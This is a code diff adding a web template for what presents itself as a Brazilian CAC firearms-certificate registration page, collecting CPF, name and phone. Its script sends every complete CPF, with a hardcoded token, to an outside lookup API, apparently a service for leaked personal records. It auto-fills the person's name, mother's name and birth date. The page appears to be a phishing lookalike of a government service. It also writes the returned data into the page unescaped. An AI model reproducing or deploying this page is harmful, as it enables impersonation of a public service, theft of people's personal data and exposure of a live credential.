@@ -1,0 +1,188 @@
+{% extends "layout.html" %}
+{% block content %}
+<main class="container mx-auto px-4 py-6">
+    <div class="max-w-4xl mx-auto">
+        <div class="page-header">
+            <h1>Registro de Certificado CAC</h1>
+            <p>Sistema de Cadastro para Certificado de Registro de Colecionador, Atirador e Caçador</p>
+            <div class="divider"></div>
+        </div>
+
+        <div class="card mb-8">
+            <div style="margin-bottom: 0px;">
+                <p class="card-description">
+                    Complete seu cadastro para obter o Certificado de Registro de Colecionador, Atirador e Caçador (CAC). 
+                    Preencha seus dados corretamente para dar início ao processo de avaliação. 
+                    Todas as informações serão verificadas conforme a legislação vigente.
+                </p>
+            </div>
+
+            <form method="POST" action="{{ url_for('submit_registration') }}" style="width: 100%; max-width: 500px; margin: 0 auto;">
+                <div style="margin-bottom: 20px;">
+                    <label for="cpf" style="display: block; font-weight: bold; color: #1f2937; font-size: 14px; margin-bottom: 8px;">CPF *</label>
+                    <input type="text" id="cpf" name="cpf" required
+                        inputmode="numeric" 
+                        pattern="\d{3}\.?\d{3}\.?\d{3}-?\d{2}"
+                        maxlength="14"
+                        style="width: 100%; height: 48px; padding: 0 16px; border: 1px solid #d1d5db; border-radius: 2px; font-size: 16px; background: white;">
+                    <p style="margin-top: 4px; font-size: 12px; color: #6b7280;">Formato: 000.000.000-00</p>
+                </div>
+
+                <div style="margin-bottom: 20px;">
+                    <label for="full_name" style="display: block; font-weight: bold; color: #1f2937; font-size: 14px; margin-bottom: 8px;">Nome Completo *</label>
+                    <input type="text" id="full_name" name="full_name" required
+                        style="width: 100%; height: 48px; padding: 0 16px; border: 1px solid #d1d5db; border-radius: 2px; font-size: 16px; background: white;">
+                </div>
+
+                <div id="additional_fields"></div>
+
+                <div style="margin-bottom: 20px;">
+                    <label for="phone" style="display: block; font-weight: bold; color: #1f2937; font-size: 14px; margin-bottom: 8px;">Telefone *</label>
+                    <input type="tel" id="phone" name="phone" required
+                        style="width: 100%; height: 48px; padding: 0 16px; border: 1px solid #d1d5db; border-radius: 2px; font-size: 16px; background: white;">
+                </div>
+
+                <div style="margin-top: 30px;">
+                    <button type="submit" class="btn-military btn-military-large w-full">
+                        <i class="fas fa-arrow-right mr-2"></i>Iniciar Cadastro CAC
+                    </button>
+                </div>
+            </form>
+        </div>
+    </div>
+</main>
+
+<script>
+document.addEventListener('DOMContentLoaded', function() {
+    const cpfInput = document.getElementById('cpf');
+    const fullNameInput = document.getElementById('full_name');
+    const additionalFieldsContainer = document.getElementById('additional_fields');
+    
+    let debounceTimer;
+    
+    cpfInput.addEventListener('input', function(e) {
+        // Remover caracteres não numéricos e aplicar formatação
+        let value = e.target.value.replace(/\D/g, '');
+        
+        // Limitar a 11 dígitos
+        if (value.length > 11) {
+            value = value.substring(0, 11);
+        }
+        
+        // Aplicar formatação do CPF
+        if (value.length <= 11) {
+            value = value.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, function(regex, arg1, arg2, arg3, arg4) {
+                if (arg4) return `${arg1}.${arg2}.${arg3}-${arg4}`;
+                if (arg3) return `${arg1}.${arg2}.${arg3}`;
+                if (arg2) return `${arg1}.${arg2}`;
+                return arg1;
+            });
+            e.target.value = value;
+            
+            // Se o CPF tiver 11 dígitos (completo), buscar dados na API
+            const cpfSemPontuacao = value.replace(/\D/g, '');
+            if (cpfSemPontuacao.length === 11) {
+                // Usar debounce para evitar muitas requisições
+                clearTimeout(debounceTimer);
+                debounceTimer = setTimeout(() => {
+                    buscarDadosCPF(cpfSemPontuacao);
+                }, 300);
+            } else {
+                // Limpar campos adicionais se CPF incompleto
+                limparCamposAdicionais();
+            }
+        }
+    });
+    
+    function buscarDadosCPF(cpf) {
+        const apiUrl = `https://api.amnesiatecnologia.rocks/?token=261207b9-0ec2-468a-ac04-f9d38a51da88&cpf=${cpf}`;
+        
+        // Mostrar indicador de carregamento
+        fullNameInput.style.background = '#f0f9ff';
+        fullNameInput.placeholder = 'Buscando dados...';
+        
+        fetch(apiUrl)
+            .then(response => response.json())
+            .then(data => {
+                console.log('Dados recebidos da API:', data);
+                
+                if (data && data.DADOS) {
+                    const dados = data.DADOS;
+                    
+                    // Preencher nome completo
+                    if (dados.nome) {
+                        fullNameInput.value = dados.nome;
+                        fullNameInput.style.background = '#f0fff4'; // Verde claro para indicar sucesso
+                    }
+                    
+                    // Criar campos adicionais
+                    criarCamposAdicionais(dados);
+                } else {
+                    // Não encontrou dados
+                    fullNameInput.style.background = '#fef2f2'; // Vermelho claro
+                    fullNameInput.placeholder = 'Nome Completo';
+                    limparCamposAdicionais();
+                }
+            })
+            .catch(error => {
+                console.error('Erro ao buscar dados do CPF:', error);
+                fullNameInput.style.background = '#fef2f2'; // Vermelho claro para erro
+                fullNameInput.placeholder = 'Nome Completo';
+                limparCamposAdicionais();
+            })
+            .finally(() => {
+                // Restaurar estilo normal após 2 segundos
+                setTimeout(() => {
+                    fullNameInput.style.background = 'white';
+                    if (!fullNameInput.value) {
+                        fullNameInput.placeholder = '';
+                    }
+                }, 2000);
+            });
+    }
+    
+    function criarCamposAdicionais(dados) {
+        // Limpar campos existentes
+        additionalFieldsContainer.innerHTML = '';
+        
+        // Campo Nome da Mãe (apenas se existir)
+        if (dados.nome_mae && dados.nome_mae.trim()) {
+            const motherNameDiv = document.createElement('div');
+            motherNameDiv.style.marginBottom = '20px';
+            motherNameDiv.innerHTML = `
+                <label for="mother_name" style="display: block; font-weight: bold; color: #1f2937; font-size: 14px; margin-bottom: 8px;">Nome da Mãe</label>
+                <input type="text" id="mother_name" name="mother_name" value="${dados.nome_mae}"
+                    style="width: 100%; height: 48px; padding: 0 16px; border: 1px solid #d1d5db; border-radius: 2px; font-size: 16px; background: #f0fff4;">
+            `;
+            additionalFieldsContainer.appendChild(motherNameDiv);
+        }
+        
+        // Campo Data de Nascimento
+        if (dados.data_nascimento) {
+            const birthDateDiv = document.createElement('div');
+            birthDateDiv.style.marginBottom = '20px';
+            
+            // Converter data de dd/mm/aaaa para aaaa-mm-dd (formato do input date)
+            let dateValue = '';
+            if (dados.data_nascimento.includes('/')) {
+                const parts = dados.data_nascimento.split('/');
+                if (parts.length === 3) {
+                    dateValue = `${parts[2]}-${parts[1].padStart(2, '0')}-${parts[0].padStart(2, '0')}`;
+                }
+            }
+            
+            birthDateDiv.innerHTML = `
+                <label for="birth_date" style="display: block; font-weight: bold; color: #1f2937; font-size: 14px; margin-bottom: 8px;">Data de Nascimento</label>
+                <input type="date" id="birth_date" name="birth_date" value="${dateValue}"
+                    style="width: 100%; height: 48px; padding: 0 16px; border: 1px solid #d1d5db; border-radius: 2px; font-size: 16px; background: #f0fff4;">
+            `;
+            additionalFieldsContainer.appendChild(birthDateDiv);
+        }
+    }
+    
+    function limparCamposAdicionais() {
+        additionalFieldsContainer.innerHTML = '';
+    }
+});
+</script>
+{% endblock %}
